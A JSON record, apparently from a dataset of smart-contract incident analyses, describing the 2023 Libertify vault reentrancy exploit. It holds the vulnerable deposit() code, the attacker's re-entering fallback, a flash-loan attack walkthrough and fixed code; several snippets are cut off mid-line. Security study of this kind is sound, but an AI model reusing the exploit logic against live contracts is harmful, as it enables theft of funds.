@@ -1,0 +1,51 @@
+{
+ "id": "2023__2023-07-11_Libertify_Reentrancy_Polygon",
+ "source_file": "2023/2023-07-11_Libertify_Reentrancy_Polygon.md",
+ "title": "Libertify — Deposit Reentrancy Attack Analysis (2023)",
+ "date": "2023-07-11",
+ "protocol": "Libertify",
+ "chain": "Polygon",
+ "loss_raw": "~$452,000 USD (Ethereum ~$162K + Polygon ~$290K)",
+ "loss_usd": 452000.0,
+ "root_cause": "The `deposit()` function allowed an external 1inch swap callback without reentrancy protection, enabling double share minting within the same transaction",
+ "attack_tx": "0x7320...8483",
+ "vulnerable_contract": "0x9c80...447b (LibertiVault)",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ Vulnerability: external 1inch swap callback allowed without nonReentrant\nfunction deposit(\n    uint256 assets,        // deposit amount (in WETH)\n    address receiver,      // share recipient address\n    bytes calldata data    // 1inch swap calldata (attacker-controlled)\n) external returns (uint256 shares) {\n    // Calculate shares based on current vault balance (same value reused on reentry)\n    uint256 vaultBalance = token0.balanceOf(address(this))\n                         + token1.balanceOf(address(this));\n\n    // ❌ Issue 1: No state (balance) update before calling external swap router\n    // ❌ Issue 2: 1inch Router executes attacker-controlled callBytes()\n    //           At this point the attacker can re-call deposit()\n    oneInchRouter.swap(aggregationExecutor, swapDesc, data);\n\n    // Calculate shares from balance increase after swap\n    uint256 newBalance = token0.balanceOf(address(this))\n                       + token1.balanceOf(address(this));\n    shares = (newBalance - vaultBalance) * totalSupply / vaultBalance;\n\n    // ❌ Issue 3: On reentry, vaultBalance still holds the stale value,\n    //           distorting share ratio calculation and minting excess shares\n    _mint(receiver, shares);\n    return shares;\n}",
+  "// Attacker contract — acting as IAggregationExecutor\nfallback() external payable {\n    nonce++;\n    // Execute reentry only on odd-numbered callbacks (prevents infinite loop)\n    if (nonce % 2 == 1) {\n        bytes memory callData = setData();\n        // ❌ Re-call LibertiVault.deposit() — reentrancy!\n        LibertiVault.deposit(0.001 ether, address(this), callData);\n    }\n    // Transfer USDT to the vault to simulate swap completion\n    USDT.transfer(address(inchV4Router), 2_500_000 * 1e6);\n}",
+  "❌ Current: arbitrary Executor allowed\n// callBytes() executed with arbitrary address extracted from data parameter\n\n//"
+ ],
+ "code_after": [
+  "// ✅ Apply OpenZeppelin ReentrancyGuard\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract LibertiVault is ReentrancyGuard {\n\n    // ✅ nonReentrant modifier blocks reentrancy at the source\n    function deposit(\n        uint256 assets,\n        address receiver,\n        bytes calldata data\n    ) external nonReentrant returns (uint256 shares) {\n        uint256 vaultBalanceBefore = token0.balanceOf(address(this))\n                                   + token1.balanceOf(address(this));\n\n        // ✅ Execute external swap under reentrancy lock\n        oneInchRouter.swap(aggregationExecutor, swapDesc, data);\n\n        uint256 vaultBalanceAfter = token0.balanceOf(address(this))\n                                  + token1.balanceOf(address(this));\n\n        // ✅ Calculate shares from actual increase only\n        uint256 delta = vaultBalanceAfter - vaultBalanceBefore;\n        require(delta > 0, \"No deposit amount\");\n        shares = delta * totalSupply / vaultBalanceBefore;\n\n        _mint(receiver, shares);\n        return shares;\n    }\n}",
+  "// ✅ Inherit OpenZeppelin ReentrancyGuard\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract LibertiVault is ReentrancyGuard {\n\n    // ✅ Block reentrancy at the source\n    function deposit(\n        uint256 assets,\n        address receiver,\n        bytes calldata data\n    ) external nonReentrant returns (uint256 shares) {\n        // ...existing logic...\n    }\n\n    // ✅ Recommended: apply nonReentrant to exit() as well\n    function exit() external nonReentrant returns (uint256, uint256) {\n        // ...existing logic...\n    }\n}"
+ ],
+ "steps": [
+  "1. testExploit() — Attack begins",
+  "→ Receives 5,000,000 USDT flash loan",
+  "2. executeOperation() — First flash loan handler",
+  "3. 1inch Router → callBytes(attackerContract, data)",
+  "→ Enters fallback() (nonce=1, odd)",
+  "4. [Reentry] LibertiVault.deposit(0.001 ether, this, data)",
+  "→ 1inch Router → callBytes(attacker, data)",
+  "→ Enters fallback() (nonce=2, even)",
+  "→ Transfers 2,500,000 USDT to 1inch Router",
+  "→ Second deposit completes, shares minted ①",
+  "(vaultBalance still holds stale value → shares over-minted)",
+  "5. LibertiVault.exit()",
+  "→ Burns all over-minted shares and withdraws WETH + USDT",
+  "→ ~123.84 WETH (~$276,000) + USDT recovered",
+  "6. WETHToUSDT() — Cover shortfall",
+  "Uniswap V3 exactOutputSingle() swaps WETH → USDT",
+  "→ Acquires enough to repay Aave flash loan principal + fee",
+  "7. Aave V2 flash loan repaid (USDT 5,000,000 + fee)",
+  "→ Second flashLoan() repeated in same manner",
+  "→ Final net profit of ~$452,000 extracted"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────────────────┐\n│ 1. testExploit() — Attack begins                                     │\n│    Aave V2.flashLoan(USDT, 5,000,000e6)                              │\n│    → Receives 5,000,000 USDT flash loan                              │\n└──────────────────────────┬──────────────────────────────────────────┘\n                           │ executeOperation() callback\n                           ▼\n┌─────────────────────────────────────────────────────────────────────┐\n│ 2. executeOperation() — First flash loan handler                     │\n│    USDT.approve(aaveV2, max)                                         │\n│    callData = setData()   ← Sets attacker as AggregationExecutor     │\n│    LibertiVault.deposit(0.001 ether, this, callData)  ← [1",
+  "// =========================================================\n// Core attack logic excerpt — Libertify_exp.sol\n// =========================================================\n\n// [Step 1] Attack entry: procure large USDT via Aave V2 flash loan\nfunction testExploit() external {\n    deal(address(WETH), address(this), 0.004 ether);   // initialize small WETH amount\n    WETH.approve(address(LibertiVault), type(uint256).max);\n\n    address[] memory assets = new address[](1);\n    assets[0] = address(USDT);\n    uint256[] memory amounts = new uint256[](1);\n    amounts[0] = 5_000_000 * 1e6;     // 5M USDT flash loan\n    uint256[] memory modes = new uint256[](1);\n    modes[0] = 0;                       // flash loan mode (repayment required)\n\n    // Repeat twice to maximize profit\n    aaveV2.flashLoan(ad"
+ ]
+}
